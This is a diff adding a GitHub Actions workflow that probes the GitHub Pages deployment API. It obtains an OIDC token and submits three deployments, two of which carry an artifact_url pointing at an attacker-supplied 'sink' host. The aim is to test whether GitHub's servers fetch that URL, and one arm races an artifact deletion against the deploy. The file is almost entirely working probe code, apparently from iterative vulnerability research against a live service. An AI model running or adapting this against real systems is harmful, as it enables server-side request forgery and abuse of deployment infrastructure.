@@ -1,0 +1,69 @@
+name: reacharm3
+on:
+  workflow_dispatch:
+    inputs:
+      sink: { required: true }
+permissions: { contents: write, pages: write, id-token: write, actions: write }
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      # WELL-FORMED Pages artifact: uncompressed artifact.tar, exactly what upload-pages-artifact produces.
+      # The previous run used a gzipped art.tar.gz, which cannot deploy and confounds resolve-vs-deploy.
+      - run: mkdir -p s && echo '<h1>ok</h1>' > s/index.html && tar -cf artifact.tar -C s .
+      - uses: actions/upload-artifact@v4
+        with: { name: d1, path: artifact.tar }
+      - uses: actions/upload-artifact@v4
+        with: { name: d2, path: artifact.tar }
+      - uses: actions/upload-artifact@v4
+        with: { name: d3, path: artifact.tar }
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SINK: ${{ inputs.sink }}
+        run: |
+          set -u
+          R=$GITHUB_REPOSITORY; A=https://api.github.com
+          API="$A/repos/$R/pages/deployments"
+          H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "PRECONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-PRE3")"
+          curl -s "${H[@]}" "$A/repos/$R/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
+          for k in d1 d2 d3; do eval "ID_$k=$(jq -r --arg n $k '.artifacts[]|select(.name==$n).id' arts.json)"; done
+          echo "IDS d1=$ID_d1 d2=$ID_d2 d3=$ID_d3"
+          mk(){ curl -s "${H[@]}" -X PUT "$A/repos/$R/contents/m3/$1.txt" \
+                 -d "$(jq -nc --arg m "m $1" --arg c "$(echo -n "$1-$GITHUB_RUN_ID"|base64 -w0)" '{message:$m,content:$c}')" \
+                 | jq -r '.commit.sha'; }
+          # Pages SERIALIZES deployments per repo: a POST while one is in progress is refused 400.
+          # Every arm must wait for a terminal state or it is never dispatched at all.
+          waitterm(){ for i in $(seq 1 14); do sleep 12
+              S=$(curl -s "${H[@]}" "$1" | jq -r '.status'); echo "   .. $S"
+              case "$S" in deployment_in_progress|deployment_queued|"") ;; *) echo "   TERMINAL=$S"; return;; esac
+            done; echo "   TERMINAL=TIMEOUT"; }
+
+          echo "===== D1: WELL-FORMED artifact_id, NO artifact_url -> does the artifact RESOLVE? ====="
+          S1=$(mk d1)
+          jq -nc --argjson id "$ID_d1" --arg s "$S1" --arg t "$T" \
+            '{artifact_id:$id,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > d1.json
+          echo "D1_HTTP=$(curl -s -o d1.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @d1.json)"
+          echo "D1_BODY=$(tr -d '\n' < d1.out)"
+          waitterm "$(jq -r '.status_url//empty' d1.out)"
+
+          echo "===== D2: SAME well-formed artifact_id PLUS artifact_url -> is the URL fetched anyway? ====="
+          S2=$(mk d2)
+          jq -nc --argjson id "$ID_d2" --arg u "$SINK/ARM-D2" --arg s "$S2" --arg t "$T" \
+            '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > d2.json
+          echo "D2_HTTP=$(curl -s -o d2.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @d2.json)"
+          echo "D2_BODY=$(tr -d '\n' < d2.out)"
+          waitterm "$(jq -r '.status_url//empty' d2.out)"
+
+          echo "===== D3: artifact DELETED right after the POST (the arm that was refused last run) ====="
+          S3=$(mk d3)
+          jq -nc --argjson id "$ID_d3" --arg u "$SINK/ARM-D3" --arg s "$S3" --arg t "$T" \
+            '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > d3.json
+          echo "D3_HTTP=$(curl -s -o d3.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @d3.json)"
+          echo "D3_DELETE=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE "${H[@]}" "$A/repos/$R/actions/artifacts/$ID_d3")"
+          echo "D3_BODY=$(tr -d '\n' < d3.out)"
+          waitterm "$(jq -r '.status_url//empty' d3.out)"
+          echo "POSTCONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-POST3")"
